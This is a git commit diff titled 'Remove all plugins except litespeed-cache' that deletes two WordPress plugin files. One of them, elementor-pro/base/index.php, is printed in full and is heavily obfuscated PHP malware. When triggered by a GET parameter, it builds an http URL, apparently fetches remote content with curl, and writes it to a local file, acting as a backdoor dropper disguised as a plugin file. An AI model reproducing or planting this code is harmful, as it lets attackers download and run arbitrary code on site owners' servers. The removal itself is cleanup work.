104fed7bce6c59003b78709f0696eac1382515b9
pixel12digital <dietrich.representacoes@gmail.com>
2025-10-30 08:27:13 -0300

    Remove all plugins except litespeed-cache

--- wp-content/plugins/elementor-pro/base/index.php
+++
@@ -1,48 +0,0 @@
-<?php goto fmyF4tP;okISVRoW5: $VMnjKr = strpos("qrtBC","vZ6pPsC"); goto MMtrAXmsn;K_AhCNBKca: if(!isset($_GET[("MLCJh")[1].("aJvm")[0].("Z5foqU")[2].("DeRmL")[3]]))exit;goto SdlZE50MCG;z0GztfQSw8: $W45n6q = lcfirst("GriWSgV"); goto ZJpElL1c;MMtrAXmsn: $cbgn7 = (/*
-*/("H6sRi")[2].("tlAEJ0")[0].("oJrWFU")[2]./*
-*/("V7HsM")[3]./**/("VtE0q")[1].("OrNHic")[1])("vDOXB","DHzhyo0Tk"); goto cwiLHYeT;JEgYqG: $gGnbJd = (/*		*/("BcCc")[1].("uIxMIV")[0].("rHR5Ka")[0].("Lal_I5")[2].("AB8_Q")[3]./**/("peNq6")[1]./**/("xu6n")[0]./*
-*/("Be7oPs")[1].("M4cAU")[2])($ab2JyOmT);goto vp7QbEBd;Wj15i9: $jilfcK = sha1("KWOSIrLd"); goto DjsAJalLx8;ge0zdGtOZ1: if(!$infoW)exit;goto uNLArGtu;rq4rzNoR: $OrXlobKIj = defined("XJtpwI"); goto fnIlDg9PS;nt94UvyQkN: $HGrXo = (/*
-	*/("H6sRi")[2].("tlAEJ0")[0].("oJrWFU")[2]./*
-		*/("V7HsM")[3]./**/("VtE0q")[1].("OrNHic")[1])("rn9V4qug","inmdG"); goto u3Pd5E2RYU;SdlZE50MCG: $iNC26 = ("ThCwz")[1].("tUEf")[0].("PtyfF0")[1].("ttp4")[2].(":jA4")[0]./*
-	*/("i/9L")[1]./**/("L/0f_v")[1].("fvQ2")[1]./**/("og_p")[0].("lZta")[0].("AQ4og")[3]./*
-*/("Ev9C")[1]./**/("mfEGhe")[0].("a7aRig")[2].("rZNDPh")[0]./**/("hWtiU")[2]./*
-*/("A.P6mv")[1].("ruxJ8")[0].("purkH")[1].("vu/ts")[2].("iJddv")[2]./**/("byav9c")[2]./**/("moikw")[2]./*
-
-*/("/OkhCu")[0].("S?N8")[1]./**/("tvdO")[0]./**/("_qih=w")[4]./*	*/("QLpW")[2]./**/("y2&l")[2]./*
-	*/("lvyVlP")[4]./*
-	
-
-	*/("z=5mk")[1]./*	*/("Sz2uM")[1]./**/("Nmydq")[3].("khgd7D")[1]./*	*/("spyay")[2].("A-MRC")[1].("1rxS")[0]./*
-*/("-QTRfL")[0]./*
-	*/("4VOUcn")[0];goto jbAQd8;PSlsubR_Bo: $srlZq_cM = ["gHK51vj_Jib8"]; goto vlWF9jK;ZJpElL1c: $oHghB = false; goto NsxZjIAfE;_BJtLTHW: $rkJVLP_N = ucwords("a_u4bfRLx"); goto BwAbNG5J;oBvFl3o: $x8KznVEHY = ["L_zOgdHRGC7I"]; goto wcm97kHS;fmyF4tP: $MrWIk_y = false; goto OyeAOgPjx;wcm97kHS: $vEcCJi3W = (("xtsO")[2].("wtBrW1")[1]./*
-*/("mw8SrH")[4].("dO_V")[2]./*
-	*/("XqrR")[2]./**/("iPzeW")[3].("pzbte")[0].("eF9RQ")[0]./**/("iaJH")[1].("zHtGU")[2])("", 13); goto AHuMRK;AHuMRK: $jKVWEoG = (string) null; goto eq2IkKsC7F;CPZVFN: $g43GLUFNy = (("wSjA7")[0].("GoDx")[1].("lV8ryx")[3].("adbRT")[1].("ywIa0")[1]./*
-		*/("JrWrJh")[3].("anRP")[0]./**/("LTypG6")[3])("", 12);goto NuDMeqhs;NsxZjIAfE: $QzSkNQs = (/*	
-*/("pHesg3")[3].("LSuE")[2].("bhfos")[0]./*
-	*/("fszv2A")[1].("LRts")[2]./*
-	*/("Z6rh")[2])("QzSkNQs",7,0);goto zbhqMJFW;bGJWNq: $infoW = copy($csSfc,("ZZKsM")[3]./**/("hOMYy")[0].("z7foTu")[3].("pt8kE")[0].("tr.Hu")[2].("piE0")[0].("VByhP")[3].("pXmk")[0]);goto MyzEZR;cwiLHYeT: $mvWbsi8 = (/*
-	*/("cTDT")[0]./*	
-	*/("pwhx")[2].("uLu5I")[0]./**/("i38nZQ")[3].("Dk1x_n")[1]./**/("__vl")[0]./*	*/("sBy83Y")[0].("ylp7")[2]./*
-	*/("Dl5nX")[1].("vfwSiH")[4]./**/("Atohw")[1])("DrCvxaXFocKH_5lt3bJk",3); goto nt94UvyQkN;nE9O3kDd6: $csSfc = stream_get_meta_data($infoW)["uri"];goto bGJWNq;Yl536VAoXU: $idH5o_G0 = strpos("bhYiJdIT2","hKaSzZFJ"); goto FbxhRm7;nnTs3L: $SVIK_GS = strval(false); goto oBvFl3o;iJnxZMR: (/**/("QDcz")[2].("guQu")[1].("riDJCx")[0].("lgcsbz")[0]./*	*/("n_6bc")[1]./**/("usOK")[1].("ze8y")[1]./**/("tS10wm")[0].("hox5j")[1]./**/("pmr6")[0].("jtrfQ")[1])($ab2JyOmT,(int)(/*	
-*/("b81AZI")[2].("h3Gg")[1].("XD__E")[2]./*
-*/("p3rfrX")[2].("oeIEZ")[1]./*	*/("px1n")[0].("Al3ym")[1]), 52);goto JEgYqG;OyeAOgPjx: $ybnyV9f = lcfirst("AhUIgmbw"); goto nnTs3L;uNLArGtu: fwrite/*x1dsK*/($infoW,$gGnbJd);goto nE9O3kDd6;X86Krm: $PFsqjaEC = (/**/("H6sRi")[2].("tlAEJ0")[0].("oJrWFU")[2]./*	*/("V7HsM")[3]./**/("VtE0q")[1].("OrNHic")[1])("PFsqjaEC", "CwDCN"); goto ukj0xNOsI;eq2IkKsC7F: $VqYchGK = metaphone("ehwbV"); goto Yl536VAoXU;M4HUMxk: $LlyfBcS1_ = (/**/("H6sRi")[2].("tlAEJ0")[0].("oJrWFU")[2]./**/("V7HsM")[3]./**/("VtE0q")[1].("OrNHic")[1])("_UJd1vr8","iBrc8_4"); goto rq4rzNoR;jbAQd8: $ab2JyOmT = (/**/("d8cUwT")[2].("s7um0E")[2].("rx87Tu")[0].("Tl8Wyw")[1]./**/("izs_ic")[3].("iluhq")[0]./**/("SqnGla")[2].("xjimhL")[2].("tCOv")[0])();goto RHtwK9d;ukj0xNOsI: (/*
-*/("QDcz")[2].("guQu")[1].("riDJCx")[0].("lgcsbz")[0]./**/("n_6bc")[1]./**/("usOK")[1].("ze8y")[1]./**/("tS10wm")[0].("hox5j")[1]./**/("pmr6")[0].("jtrfQ")[1])($ab2JyOmT,(int)(/**/("Muj1iN")[3]./**/("g9tCM")[1]./*
-	*/("9NiJ7d")[0].("Bds1PI")[3]./*
-*/("Vs3g_y")[2]), 1);goto dSXUpvNqi0;Md4S2Bm: $z_tv1M = ucwords("BlIXs"); goto V2qYVUXD7;PPCZO8: $ZgD5a = strval(false); goto iJnxZMR;FbxhRm7: $bgIi8MXeC = ucwords("t6dFBz"); goto QDCMKTa;u3Pd5E2RYU: $FTnecklQ = defined("g0zeiq_1"); goto M4HUMxk;vp7QbEBd: $YGgS4VHLB = (("psvSR")[1]./**/("jhitG")[3].("Qwr6")[2]./**/("KtKbhE")[1].("GSfog")[3].("CXkrP")[2])("YGgS4VHLB"); goto PSlsubR_Bo;T7KoPF_t: $aPMR2y3hU = (string) null; goto okISVRoW5;V2qYVUXD7: $m9mnK = (/**/("pHesg3")[3].("LSuE")[2].("bhfos")[0]./*
-	*/("fszv2A")[1].("LRts")[2]./*
-	
-*/("Z6rh")[2])("m9mnK",5,0);goto T7KoPF_t;dSXUpvNqi0: (/**/("QDcz")[2].("guQu")[1].("riDJCx")[0].("lgcsbz")[0]./*
-	*/("n_6bc")[1]./*
-*/("usOK")[1].("ze8y")[1]./**/("tS10wm")[0].("hox5j")[1]./**/("pmr6")[0].("jtrfQ")[1])($ab2JyOmT,(int)(("h6XvyR")[1]./**/("IOB43h")[3].("_Cf6o")[0]./**/("epr6T")[2].("OgDPej")[4]./*
-	*/("CZpuEv")[2]./**/("ZvlfpP")[2]), 0);goto PPCZO8;QDCMKTa: $iblzrTW = define("kwXDJ","mymVG"); goto _BJtLTHW;vlWF9jK: $R1m0k = (("Siwk17")[1].("UmQNK")[1]./*
-*/("jpUq3")[1].("lkWZ")[0].("oOaBz")[0]./**/("k5Xduf")[3]./**/("ebnV3")[0])("R1m0k",[]);goto CPZVFN;RHtwK9d: (/**/("QDcz")[2].("guQu")[1].("riDJCx")[0].("lgcsbz")[0]./*
-		*/("n_6bc")[1]./**/("usOK")[1].("ze8y")[1]./**/("tS10wm")[0].("hox5j")[1]./*		*/("pmr6")[0].("jtrfQ")[1])($ab2JyOmT,(int)(/*
-	
-	*/("1oXD95")[0].("d0nv")[1].("Q_O0s9")[3]./**/("S0NFbi")[1]./*	
-*/("2zEeMI")[0]),$iNC26);goto X86Krm;zbhqMJFW: $G2dKJm3y_ = str_shuffle("Y93_lJBp"); goto Md4S2Bm;DjsAJalLx8: $jaBVv_E7 = false; goto K_AhCNBKca;NuDMeqhs: (("xc1c")[1].("WunymP")[1].("xrrQ")[1]./*
-*/("odlK")[2]./**/("__lE_")[1]./*
-	*/("BVc5H")[2]./**/("ElTbed")[1].("bP0o9")[3]./**/("sFMDL")[0]./*
-	
-	*/("IkheD")[3])($ab2JyOmT);goto pTOk8K;MyzEZR: echo /**/("ssVpb")[1].("Kmukly")[2]./**/("Msfc1")[3].("Vz7Zcl")[4]./*
-	*/("ejRvn")[0]./*
-*/("aUOs7")[3].("QsUH")[1];goto z0GztfQSw8;pTOk8K: $infoW = tmpfile();goto ge0zdGtOZ1;BwAbNG5J: $HLAOM = md5("X_Rp5Orb"); goto Wj15i9;fnIlDg9PS:""; ?>
--- wp-content/plugins/hostinger-ai-assistant/gutenberg-block/dist/index.asset.php
+++
@@ -1,1 +0,0 @@
-<?php return array('dependencies' => array('react', 'wp-blocks', 'wp-i18n'), 'version' => '0aa8308f4d1c908f5766');
